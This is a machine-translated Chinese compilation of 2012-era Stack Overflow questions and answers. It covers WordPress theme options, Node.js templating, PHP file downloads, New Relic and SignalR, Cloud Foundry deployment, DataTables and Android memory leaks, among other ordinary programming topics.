我有自己的带有选项设置的 wordpress 模板。我的选项设置具有背景图像路径选项。我将此选项值保存在变量中。现在如何添加此选项设置值以获取特定 div 类的背景图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T08:05:08.523

您需要一个可以同时放置 CSS 和 PHP 的页面，例如模板中的 header.php。请务必注意这个 CSS hack 在那里，以便您可以在更新主题时重新添加它。

现在，在您的 header.php 文件中，就在`</head>`标签之前，添加以下内容：

```
<style type='text/css'>
    /* div selector */ {
        background: url(<?php echo get_option("option_name"); ?>);
    }
</style>
</head> 
```

您需要添加一个 CSS 选择器来选择您想要拥有背景图像的 div，并且您需要确保背景图像链接正确。如果图像一开始没有正确链接，您可能需要将 /wp-content/ 或类似内容添加到 CSS 或选项值。

# autohotkey - 跳到下一段

> ID：13490460
> 
> 赞同：1
> 
> 时间：2012-11-21T09:49:45.813
> 
> 标签：autohotkey

我想在 Matlab 编辑器中从键盘跳到下一段。这在 Matlab 编辑器中是不可能的，所以我正在寻找可以做到这一点的 Autohotkeyscript。例如，考虑以下两个块：

啊啊啊 啊啊啊

bbbb; bbbb;

我希望能够按键盘快捷键 CTRL+Down 和 CTRL+Up 在 Aaaa 中光标位置之间切换；和BBb；

这实际上是大多数编辑器（如 UltraEdit 等）的标准，但在 Matlab 编辑器中却不是。有没有一种简单的方法可以使用自动热键脚本来实现这一点。

谢谢

# javascript - 我想知道如何在服务器上的 HTML 文档中执行 JS

> ID：13490461
> 
> 赞同：1
> 
> 时间：2012-11-21T09:49:53.043
> 
> 标签：javascript, html, node.js, web-applications, web

在 php 中，您用于`<?php ?>`在 html 文档中执行 php 代码。你如何在 Nodejs 中做到这一点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:51:12.113

您应该使用模板引擎。例如，请参见 ejs 或翡翠。

[http://embeddedjs.com/](http://embeddedjs.com/)

[http://jade-lang.com/](http://jade-lang.com/)

如果你使用的是Express nodejs框架，那么使用jade是很舒服的。还有一个名为 Bliss 的模板引擎，类似于 ASP.NET 中的 Razor Engine

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T09:51:56.573

如果模板引擎是 ejs 那么`<%- nameofvariable %>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:06:08.723

您可以使用模板jade 使用nodejs 的express 框架。 [https://github.com/visionmedia/jade#readme](https://github.com/visionmedia/jade#readme)

# ios - 将图像从 MPMediaItemPropertyArtwork 保存到 NSDocument

> ID：13490464
> 
> 赞同：1
> 
> 时间：2012-11-21T09:50:05.533
> 
> 标签：ios, cgimage, nsdocument

目前我想从音乐库 (MPMedia) 中获取专辑插图并将其保存为 png 或 jpg 文件。

这是我的代码：

```
UIImage *albumImage = [item valueForProperty:MPMediaItemPropertyArtwork];
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];
NSString *savedImagePath = [NSString stringWithFormat:@"%@/%@.png",documentsDirectory, titleWithID];
UIImage *image = albumImage; 
NSData *imageData = UIImagePNGRepresentation(image);
[imageData writeToFile:savedImagePath atomically:NO]; 
```

但过程停止在 `NSData *imageData = UIImagePNGRepresentation(image)`

我得到错误：

> [MPConcreteMediaItemArtwork CGImage]：无法识别的选择器发送到实例 0x1ed33c80

显然专辑插图是`CGImage`我无法将其保存为 png。任何想法？请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-08-19T21:06:57.040

对于一岁的问题：

```
[[item valueForProperty:MPMediaItemPropertyArtwork] imageWithSize:CGSizeMake(320.0, 320.0)]; 
```

要从 MPConcreteMediaItemArtwork 获取 UIImage，您必须使用 imageWithSize:，指定图像尺寸。

# php - 无法下载多个文件

> ID：13490468
> 
> 赞同：0
> 
> 时间：2012-11-21T09:50:11.163
> 
> 标签：php, html, download

我正在编写一个 php 页面来将文件从服务器下载给用户。这是我的代码：

```
 clearstatcache();
  //Output stream to client
  header("Pragma: public");
  header("Expires: 0");
  header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
  header("Cache-Control: private", false);
  header("Content-Type: application/zip");
  header("Content-Disposition: attachment; filename=\"" . $zipName . "\"; filename*=utf-8''" . rawurlencode($zipName) . ";");
  header("Content-Transfer-Encoding: binary");
  header("Accept-Ranges: bytes");
  header("Content-Length: " . (filesize($downloadFile)));

  $fp = fopen($downloadFile, "rb");
  ob_clean();
  while (!feof($fp) && ( connection_status() == 0 ) && !connection_aborted()) {
    print( fread($fp, 1024 * 1024));
    flush();
    ob_flush();
  }
  fclose($fp); 
```

我面临的问题：当用户单击下载按钮时，服务器将文件发送给用户。当用户下载文件时，用户再次点击下载按钮，请求现在没有执行（所有其他请求都无法执行）。当用户完全下载第一个文件时，开始第二个文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T09:58:12.393

这通常发生在您使用会话时。看看这篇[文章](http://konrness.com/php5/how-to-prevent-blocking-php-requests/)。如果您不需要会话 - 只需将其关闭以获取下载页面。或者，如果您需要它 - 在脚本开始时获取您需要的所有值并立即关闭会话。这将允许执行另一个脚本。

# c - 在C中访问零长度数组的地址时出现编译错误

> ID：13490471
> 
> 赞同：2
> 
> 时间：2012-11-21T09:50:22.613
> 
> 标签：c

> **可能重复：**
> [零长度数组与指针](https://stackoverflow.com/questions/627364/zero-length-arrays-vs-pointers)

一些新的编译器会为以下情况抛出编译错误

```
struct test {
int length;
char data[0];
};

int main(void)
{
char string[20] = {0};
struct test *t;

//Some code

memcpy(string, t->data, 19); //Compilation error 
} 
```

但是，如果我这样做，这将得到解决。

```
memcpy(string, &(t->data[0]), 19); 
```

某些新编译器强制执行此限制的任何原因？

编辑以纠正错误

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T09:54:59.973

这有什么问题：

```
struct test t;

memcpy(string, test->data, 19); 
```

? 提示，`test`是一个*类型*。

编辑：至于真正的答案，请参阅这个问题：[零长度数组与指针](https://stackoverflow.com/questions/627364/zero-length-arrays-vs-pointers)（或类似的问题）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:01:58.820

数组不能有`0`size 。

这是标准：

ISO 9899:2011 6.7.6.2：

```
 If the expression is a constant expression, it shall have a value
   greater than zero 
```

第二个

用这个：

```
memcpy(string,t->data,19); instead of what you have used. 
```

# c# - 忽略 New Relic 中的持久 SignalR 连接

> ID：13490473
> 
> 赞同：29
> 
> 时间：2012-11-21T09:50:25.420
> 
> 标签：c#, asp.net-mvc, signalr, newrelic

我应该在哪里调用`NewRelic.Api.Agent.NewRelic.IgnoreApdex()`或`NewRelic.Api.Agent.NewRelic.IgnoreTransaction()`在我的 SignalR 集线器中调用，以防止长时间运行的持久连接掩盖我的应用程序监控日志？

![SignalR主导监控的New Relic截图](../Images/926ce7c3940f1e60e86928c9e262fb3c.png)

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2014-11-11T12:43:56.843

要继续 Micah 的回答，这里是用于忽略所有信号器调用的自定义检测文件。

创建到 C:\ProgramData\New Relic.NET Agent\Extensions\IgnoreSignalR.xml

```
<?xml version="1.0" encoding="utf-8"?>
<extension xmlns="urn:newrelic-extension">
    <instrumentation>

        <!-- Optional for basic traces. -->
        <tracerFactory name="NewRelic.Agent.Core.Tracer.Factories.IgnoreTransactionTracerFactory">
            <match assemblyName="Microsoft.AspNet.SignalR.Core" className="Microsoft.AspNet.SignalR.PersistentConnection">
                <exactMethodMatcher methodName="ProcessRequest"/>
            </match>
        </tracerFactory>
    </instrumentation>
</extension> 
```

记得做iisreset。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-21T18:01:17.047

哦，很好的问题，一个我自己还没有想到的问题。我认为您需要做的是编写一个自定义模块，因为模块在所有处理程序之前执行，它检测到 SignalR AspNetHandler 处理程序是被请求的处理程序，如果是，则调用 NewRelic IgnoreXXX 方法。

只是吐口水（例如我没有测试过这个）该模块可能看起来像这样：

```
public class SignalRNewRelicIgnoreHttpModule : IHttpModule
{
    public void Init(HttpApplication context)
    {
        context.PostMapRequestHandler += (s, a) =>
            {
                if(HttpContext.Current.Handler is SignalR.Hosting.AspNet.AspNetHandler)
                {
                    NewRelic.Api.Agent.NewRelic.IgnoreTransaction();
                }
            };
    }

    public void Dispose()
    {

    }
} 
```

然后（显然？）您需要像这样在配置中注册该模块......

**IIS集成模式：**

```
<configuration>
  <system.webServer>
    <modules>
        <add name="SignalRNewRelicIgnoreHttpModule" type="WhateverNamespace.SignalRNewRelicIgnoreHttpModule, WhateverAssemblyName" />
    </modules>
   </system.webServer>
</configuration> 
```

**IIS 经典模式：**

```
<configuration>
    <system.web>
        <httpModules>
            <add name="SignalRNewRelicIgnoreHttpModule" type="WhateverNamespace.SignalRNewRelicIgnoreHttpModule, WhateverAssemblyName" />
        </httpModules>
    </system.web>
</configuration> 
```

* * *

## *更新：2013 年 6 月 25 日*

正如@dfowler 在评论中所警告的那样，SignalR 已经改变了它的托管方式，现在改为依赖基于[Owin](http://owin.org/)的托管。这很好，因为它将 SignalR 直接与 ASP.NET/IIS 分离，但这意味着上述方法显然不再适用。相反，您需要做的是确保使用如下示例模块（也可[在此处的要点](https://gist.github.com/drub0y/5860125)中获得）配置 Owin 管道，以禁用对管道的跟踪：

```
public class NewRelicIgnoreTransactionOwinModule
{
    private AppFunc _nextAppFunc;

    public NewRelicIgnoreTransactionOwinModule(AppFunc nextAppFunc)
    {
        _nextAppFunc = nextAppFunc;
    }

    public Task Invoke(IDictionary<string, object> environment)
    {
        // Tell NewRelic to ignore this particular transaction
        NewRelic.Api.Agent.NewRelic.IgnoreTransaction();

        return _nextAppFunc(environment);
    }
} 
```

然后，在您的 Startup::Configuration 方法中，只需确保`IAppBuilder`在映射任何 SignalR 连接/集线器之前将此模块添加到。这应该看起来像这样：

```
public class Startup
{
    public void Configuration(IAppBuilder app)
    {
        app.Use(typeof(NewRelicIgnoreTransactionOwinModule));
        app.MapHubs();
    }
} 
```

最后，应该注意的是，现在这采用了一种非常简单的方法，假设您的应用程序范围内不会有任何其他 Owin 请求。如果您将 SignalR 混合到另一个具有其他 Owin 请求的 Web 应用程序中，则此特定模块实现也会导致这些请求被忽略，因此可能需要一个更高级的模块来检查传入请求是否实际上以 SignalR URL 为目标。现在，我把它留给读者去弄清楚。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-02-21T18:22:54.273

也可以使用 IgnoreTransactionTracerFactory 通过自定义检测忽略事务。当您不想将 API 添加到项目中或想要忽略基于无法更改的框架方法的事务时，这特别有用。

您的自定义检测文件将类似于：

```
<?xml version="1.0" encoding="utf-8"?>
<extension xmlns="urn:newrelic-extension">
  <instrumentation>
    <tracerFactory name="NewRelic.Agent.Core.Tracer.Factories.IgnoreTransactionTracerFactory">
      <match assemblyName="System.Web.Extensions" className="System.Web.Handlers.ScriptResourceHandler">
        <exactMethodMatcher methodName="Throw404" />
      </match>
    </tracerFactory>
  </instrumentation>
</extension> 
```

如果你能找到一个总是在请求线程上调用的 SignalR 框架方法（你只能在请求线程上调用 IgnoreTransaction，而不是在异步线程上）你可以在上面填写 assemblyName/className/methodName，它会是与在该方法中调用 IgnoreTransaction API 相同。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-04-08T11:38:19.920

这整个问题似乎是由 SignalR 控制器上的“连接”方法引起的。我创建了一个集线器管道模块，它通过覆盖 OnBeforeConnect 方法来忽略 NewRelic 日志记录。

在 web 应用程序的 Application_Start() 方法 (global.asax.cs) 中调用 maphubs 之后的某处，添加以下内容：

```
GlobalHost.HubPipeline.AddModule(new IgnoreNewRelicConnectionsModule()); 
```

然后创建这个类：

```
private class IgnoreNewRelicConnectionsModule : HubPipelineModule
{
    protected override bool OnBeforeConnect(IHub hub)
    {
        NewRelic.Api.Agent.NewRelic.IgnoreTransaction();
        return base.OnBeforeConnect(hub);
    }

} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-03-31T13:50:27.063

对于使用旧版本 SignalR 的人，这里是 xml 工具

```
<tracerFactory name="NewRelic.Agent.Core.Tracer.Factories.IgnoreTransactionTracerFactory">
    <match assemblyName="SignalR.Hosting.AspNet" className="SignalR.Hosting.AspNet.AspNetHandler">
        <exactMethodMatcher methodName="ProcessRequestAsync"/>
    </match>
</tracerFactory> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-12-13T12:45:16.273

在 SignalR.Core 2.2.2 中有两个 AuthorizeRequest 方法。所以 New Relic 乐器文件应该是这样的：

```
<?xml version="1.0" encoding="utf-8"?>
<extension xmlns="urn:newrelic-extension">
    <instrumentation>
        <tracerFactory name="NewRelic.Agent.Core.Tracer.Factories.IgnoreTransactionTracerFactory">
            <match assemblyName="Microsoft.AspNet.SignalR.Core" className="Microsoft.AspNet.SignalR.PersistentConnection">
                <exactMethodMatcher methodName="AuthorizeRequest"/>
            </match>
             <match assemblyName="Microsoft.AspNet.SignalR.Core" className="Microsoft.AspNet.SignalR.Hubs.HubDispatcher">
                <exactMethodMatcher methodName="AuthorizeRequest"/>
            </match>
        </tracerFactory>
    </instrumentation>
</extension> 
```

将此文件放入“C:\ProgramData\New Relic.NET Agent\Extensions”可解决问题。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-02-24T13:12:07.783

```
 public Task Invoke(IDictionary<string, object> environment)
    {
        object value = "";

        //Check if the OWIN key is present
        if (environment.ContainsKey("owin.RequestPath"))
        {
            //Get the value of the key
            environment.TryGetValue("owin.RequestPath", out value);
            //This will block all signalr request, but we can configure according to requirements
            if (value.ToString().Contains("/signalr"))
            {
                // Tell NewRelic to ignore this particular transaction
                NewRelic.Api.Agent.NewRelic.IgnoreTransaction();
                NewRelic.Api.Agent.NewRelic.IgnoreApdex();
            }
        }
        return _nextAppFunc(environment);
    } 
```

# uploadify - 在 Uploadify 3.2 中设置 formData 失败并出现 Javascript 错误

> ID：13490477
> 
> 赞同：1
> 
> 时间：2012-11-21T09:50:38.293
> 
> 标签：uploadify, swfupload

根据 Uploadify 文档，可以使用以下方式设置设置：

```
$('#file_upload').uploadify('settings','formData', { 'myfield': 'myvalue' }); 
```

但是，当我使用它时，我得到了错误`Uncaught Call to SetPostParams failed`

我也试过：

```
$('#file_upload').uploadify('settings','postData', { 'myfield': 'myvalue' }); 
```

有趣的是，它成功了，但实际上并没有在上传时发布任何数据。

我相信旧的做法是：

```
$('#file_upload').uploadifySettings('formData', { 'myfield': 'myvalue' }); 
```

但是这个调用只会抛出一个错误，即对象没有`uploadifySettings`方法。

请帮忙！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:19:22.653

**解决了**

首先，只是为了确认这样做的正确方法是：

```
$('#file_upload').uploadify('settings','formData', { 'myfield': 'myvalue' }); 
```

其次，在我的情况下它失败的原因是因为处理上传的 swf 对象位于一个尚不可见的选项卡中，从而将其与 Javascript 断开连接。出于这个原因，您可以在其他设置不可见但不可见时更改其他设置，因为它是直接在 swf 对象上设置的。

我希望这对其他人有帮助，就像它对我有帮助一样！:)

# javascript - Fancybox 中的 Facebook 点赞按钮

> ID：13490478
> 
> 赞同：1
> 
> 时间：2012-11-21T09:50:38.573
> 
> 标签：javascript, html, css, facebook, fancybox

我的 FancyBox 的内容由 ajax 加载。在此内容中，我有一些社交按钮（例如，推文、+1）。但是我有一个like按钮的问题，通常当你点击一个弹出框时，我们会提供不同的共享选项，但在我的情况下它没有完全显示![在此处输入图像描述](../Images/0301c4fec3e6454bbb12bf3ba24438e1.png)。

我希望弹出框出现在fancybox的外部以完整显示，如google+

![在此处输入图像描述](../Images/7ab352e4f19cc93ab11b65edc022c1e6.png)

怎么做 ？

# google-chrome-extension - Chrome扩展，在窗口中绘制画布，而不是文档

> ID：13490480
> 
> 赞同：1
> 
> 时间：2012-11-21T09:50:43.143
> 
> 标签：google-chrome-extension, html5-canvas

如何在 Canvas HTML5 或 Chrome 扩展的其他插件上绘制一条拍摄线，用于向用户显示的游戏网页，**但对象画布不得出现在文档 DOM 元素**中。

```
alert(canvas.length) // 0 
```

可以吗，谢谢

# spring - Coherence 缓存成员超时并从集群中删除

> ID：13490481
> 
> 赞同：1
> 
> 时间：2012-11-21T09:50:47.777
> 
> 标签：spring, hibernate, oracle-coherence

Coherence 缓存成员超时并在 Spring Hibernate Tomcat 应用程序中从集群中删除。结果数据不同步，所有缓存成员都不会同时更新。这个应用程序一直在 PROD 中运行，我们最近所做的唯一更改是升级 Tomcat。这是一个生产问题。任何建议都会有所帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:16:42.660

正如您所说，缓存成员在超时时被删除，或者换句话说，它们停止响应集群的其余部分。

发生这种情况的最可能原因是正在发生停止世界的垃圾收集，因此没有发送将成员保留在集群中的心跳。

在短期内，您需要查看垃圾收集日志（希望您已配置这些日志）并最终分析/调整您的应用程序以确保内存使用和垃圾收集是有效的。

从长远来看，让与集群不完全相关的进程加入集群是一个坏主意，尤其是在它们启用了存储的情况下。您应该使用扩展 TCP 来允许这些其他进程改为访问缓存。

这样做的原因是，以您的情况为例，Tomcat 具有各种资源需求，最终在 JVM 上引入了更广泛的内存/垃圾收集需求，而不仅仅是集群成员。因此，为更广泛的需求调整 JVM 将引入更多妥协，最终使运行内存/GC 优化以保持集群稳定的 JVM 变得更加困难。

# java - 如何使用 CloudFoundry.com 在云中运行 Java SE 应用程序？

> ID：13490490
> 
> 赞同：1
> 
> 时间：2012-11-21T09:51:14.187
> 
> 标签：java, http, port, cloud-foundry

我是 cloudfoundry.com 的新手，正在尝试部署我现有的基于 Java SE 的应用程序服务器（在端口 5050 上运行的自定义应用程序 Web 服务器）。我的应用程序没有使用任何基于 Java SE JDK 的应用程序的框架。

我正在使用带有 cloudfoundry 插件的 eclipse，并使用“服务器视图”（cloudfoundry.com 实例）部署了我的应用程序，我可以从控制台看到它正在运行。

我的问题是：

1.  我的应用程序的 URL 是什么？是`http://<appname>.cloudfoundry.com`吗？

2.  如何通过 URL 访问我部署的应用程序。我试过了`http://<appname>.cloudfoundry.com`，`http://<appname>.cloudfoundry.com:5050`但失败了。我可以从论坛中找到只有 80 和 443 端口为入站 tcp 连接打开，所以我的下一个问题是如何设置规则以便对 appname.cloudfoundry:80 的 HTTP 请求在 5050 端口转发到我的应用程序？

3.  如何设置规则以便`appname.cloudfoundry:80`在 5050 端口转发到我的应用程序？可能吗？

4.  我有一些静态页面模板和 css 文件，我的应用程序需要这些文件来生成动态页面，然后临时存储它们，可以吗？如果是，如何将静态页面与应用程序一起存储？以及如何创建文件？

5.  我知道传出的 TCP 请求也仅限于 80 和 443 端口，如果我需要连接到 8080 或任何其他端口，那么出路是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T13:24:46.970

这里有一些答案给你：

1.  将是您选择的任何内容（前提是可用，*即*尚未被其他一些应用程序采用）

2.  您需要修改您的应用程序，尤其是应用程序的 http 服务器部分，以便它绑定到 Cloud Foundry 为您分配的端口和主机名。更具体地说，Cloud Foundry 为此目的宣传了两个环境变量：`VCAP_APP_PORT`和`VCAP_APP_HOST`（您可能不需要担心后者）。一个很好的读物是[http://blog.cloudfoundry.org/2012/06/18/deploying-tomcat-7-using-the-standalone-framework/](http://blog.cloudfoundry.org/2012/06/18/deploying-tomcat-7-using-the-standalone-framework/)，它以 tomcat 为例。如果您想从 Java 代码访问环境变量（而不是像博客文章那样从 shell 访问），您将需要 System.getEnv()。

3.  如果您这样做了，这将自动工作 2)

4.  目前不支持纯静态文件。但是你可以

    1.  让您的 http 服务器处理它们
    2.  如果可以接受，请使用 Cloud Foundry 上的另一个应用程序为他们提供服务。正如我的同事安迪[在这里](http://andypiper.co.uk/2012/08/21/a-simple-website-on-cloud-foundry/)解释的那样，使用例如 Sinatra 真的很容易。
5.  IIRC，出站连接的唯一限制是端口 25，以防止垃圾邮件。所以你应该很好。请参阅[http://support.cloudfoundry.com/entries/20951826-cloudfoundry-com-faq](http://support.cloudfoundry.com/entries/20951826-cloudfoundry-com-faq)

# jquery - jQuery DataTable - 服务器端处理

> ID：13490491
> 
> 赞同：1
> 
> 时间：2012-11-21T09:51:15.387
> 
> 标签：jquery

我从数据库中读取了 100 个数据，但我只向 DataTable 发送了 10 个数据。[但我想使用来自http://www.datatables.net/usage/server-side](http://www.datatables.net/usage/server-side)的服务器端处理。

我的代码是：

```
function prepareDataTable() {
$('#displayData').dataTable({
    "iDisplayLength": 10,
    "iDisplayStart": 20,
    "aaData": Rows,
    "iTotalRecords": 57,
    "iTotalDisplayRecords": 57,
    "bSort": false,
    "bFilter": false,
    "aoColumns": [
        { "mDataProp": "name" }
    ]
}); 
```

在行中，我只有 10 个数据。所以我想使用 Ajax 来传递下一个数据。而且我要：

1.  我想显示“显示 1 到 10 个 iTotalRecords 条目”，其中 iTotalRecords 是我所有数据的数量。
2.  箭头下一个/上一个将启用（现在禁用）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-25T11:04:11.303

您应该首先使用服务器端脚本，通过它您可以获得 json 格式的数据，然后您的代码变得更像以下内容：

```
$('#displayData').dataTable({
    "bJQueryUI": true,
    "sPaginationType": "full_numbers",
    "bProcessing": true,
    "bServerSide": true,
    "sAjaxSource": "server_processing.php",
    ...etc option
}); 
```

在`server_processing.php`中，根据您的要求使用选项来获取数据。

如需更多帮助，请参阅[服务器端数据表](http://datatables.net/release-datatables/examples/data_sources/server_side.html)。

# android - Android 应用程序中的内存泄漏

> ID：13490493
> 
> 赞同：22
> 
> 时间：2012-11-21T09:51:30.443
> 
> 标签：android, ddms

我在我的应用程序中遇到了一些内存泄漏。我第一次怀疑内存泄漏是在我通过点击按钮启动新的`Activity`. 使用`DDMS`并转出 a后`.hprof file`，我打开了这个文件`Eclipse Memory Analyzer`

我得到了三个可能的内存泄漏，显示在饼图中： ![在此处输入图像描述](../Images/3078d850a998e5b3276974fa03df29ff.png)

以及对内存泄漏的描述：

**嫌疑人1**

由“”加载的“android.widget.LinearLayout”的 122 个实例占用 29 585 384 (38,74%) 个字节。

最大实例：

```
•android.widget.LinearLayout @ 0x4258c008 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x425c8688 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x425e3988 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x4296e198 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x429d3aa8 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x42a10c78 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x448a1f10 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x44a65d58 - 2 268 848 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x42a14098 - 2 268 824 (2,97%) bytes. 
•android.widget.LinearLayout @ 0x4258bd30 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x425c83b0 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x425ddff8 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x4296df80 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x42a109a0 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x42a13dc0 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x448a1c38 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x448cc338 - 999 528 (1,31%) bytes. 
•android.widget.LinearLayout @ 0x44a65a80 - 999 528 (1,31%) bytes. 
```

**嫌疑人2**

由“”加载的“android.widget.FrameLayout”的 15 个实例占用 29 405 016 (38,51%) 个字节。

最大实例：

```
•android.widget.FrameLayout @ 0x4245b490 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x4247a330 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x425aa1d8 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x425df8b0 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x425efe68 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x42627590 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x42987a70 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x4299df20 - 3 266 728 (4,28%) bytes. 
•android.widget.FrameLayout @ 0x448b6f28 - 3 266 728 (4,28%) bytes. 
```

**嫌疑人3**

```
2 682 instances of "java.lang.Class", loaded by "<system class loader>" occupy 8 662 744 (11,34%) bytes. 

Biggest instances:

•class android.content.res.Resources @ 0x41a4f708 - 7 485 176 (9,80%) bytes. 
```

我的第一个想法是查看`R.java`文件，因为我可以看到一些对可能的内存泄漏的十六进制引用。`R.java`我试图从 Eclipse Memory Analyzer 中搜索十六进制字符串，但在文件中找不到地址。

然后我查看了支配树，结果如下： ![在此处输入图像描述](../Images/bb7599745def191c4561948b40fbaa79.png)

这只是列表中的第一个条目，但这是最大的一个。

有了这些信息，任何人都可以给我一个关于如何跟踪内存泄漏的提示吗？如果我需要在这篇文章中添加更多信息，请添加评论。

提前致谢。

**编辑**

问题可能出在我的 Base 类中。所有的活动都继承自这个类。这个类的工作是在左上角设置一个SlidingMenu。这是这个类的代码：

```
 public class Base extends Activity implements OnSlideMenuItemClickListener {

        public SlideMenu slidemenu;
        ImageButton b;
        Time t; 

        BluetoothCommunicator btCom; 
        BroadcastReceiver btBroadCaster;
        MonitorBluetoothState bluetoothState;

        public void setTab(int id) {
            setContentView(id);
            overridePendingTransition(R.anim.activityfade, R.anim.activityfadeout);
            slidemenu = (SlideMenu) findViewById(R.id.slideMenu);
            slidemenu.init(this, R.menu.slide, this, 450);
            slidemenu.setHeaderImage(getResources().getDrawable(R.drawable.ic_launcher));

            b = (ImageButton) findViewById(R.id.BtnSlide);
            b.setOnClickListener(new OnClickListener() {

                public void onClick(View v) {
                    slidemenu.show();

                }   
            });

            b.setOnTouchListener(new OnTouchListener() {

                @Override
                public boolean onTouch(View v, MotionEvent event) {

                    switch (event.getAction()) {

                    case MotionEvent.ACTION_DOWN:
                        b.setImageResource(R.drawable.lincolor);
                        break;
                    case MotionEvent.ACTION_UP:
                        b.setImageResource(R.drawable.lin);
                        break;
                    }
                    return false;
                }
            });
        }

        @Override
        public void onSlideMenuItemClick(int itemId) {

            Class<?> cls = null; 

            switch(itemId) {
            case R.id.item_one:
                cls = Home.class;
                break;
            case R.id.item_two:
                cls = History.class;
                break;
            case R.id.item_three:
                cls = ClearHistoryDialog.class;
                break;
            case R.id.item_four:
                cls = SendLogDialog.class;
                break;
            case R.id.item_five:
                cls = PasswordDialog.class;
                break;
            case R.id.item_six:
                cls = About.class; 
                break;
            }
            Intent intent = new Intent(this, cls); 
            startActivity(intent); 
        }
    } 
```

在我的其他活动中，这个 setTab 方法将被这样调用：

```
 public class Main extends Base {
        public void onCreate(Bundle b) {
          super.onCreate(b);
          super.setTab(R.layout.Home);
        }
    } 
```

主页布局是这样的：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/parent"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="#e4e8ed"
    android:gravity="top" >

    <LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/first"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="0px" >

        <include
            android:id="@+id/tabBar"
            layout="@layout/tab" />

        <com.workspace.tobias
            android:id="@+id/slideMenu"
            android:layout_width="match_parent"
            android:layout_height="match_parent" />

        <Button
            android:id="@+id/nist"
            android:layout_width="match_parent"
            android:layout_height="67dp"
            android:layout_gravity="center_horizontal"
            android:layout_marginBottom="3dp"
            android:layout_marginLeft="3dp"
            android:layout_marginRight="3dp"
            android:layout_marginTop="3dp"
            android:background="@drawable/ready"
            android:textColor="#FFFFFF" />

        <ListView
            android:id="@+id/lastCases"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent" />
    </LinearLayout>

    <LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/loading"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="300dp"
        android:orientation="horizontal" >

        <ProgressBar
            android:id="@+id/progress"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:indeterminate="true" />

        <TextView
            android:id="@+id/loadingCases"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_gravity="center_vertical"
            android:text="@string/Loading"
            android:textColor="#707070"
            android:textSize="18dp"
            android:layout_marginLeft="10dp" />
    </LinearLayout>

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-21T10:47:37.023

您是否使用静态变量来缓存大资源？
如果是，那么在 Android 应用程序中使用活动上下文来加载此类资源是一个常见错误。这导致维持活动及其所有资源，即使不再需要它们。
要解决此问题，请使用应用程序上下文来加载此类资源！

您可以参考这篇[Android 开发者博客文章](http://android-developers.blogspot.co.il/2009/01/avoiding-memory-leaks.html)了解更多详细信息。

# c# - C# 控制台应用程序命令会话历史记录

> ID：13490497
> 
> 赞同：2
> 
> 时间：2012-11-21T09:51:45.497
> 
> 标签：c#, command-line-interface

我有简单的命令行应用程序，我想存储在程序启动之间输入的命令。

单独存储没问题，我知道怎么做，但是我怎么恢复呢？ `Console`类没有任何设置历史记录的方法，如果我在应用程序开始时按向上箭头，它是空的。

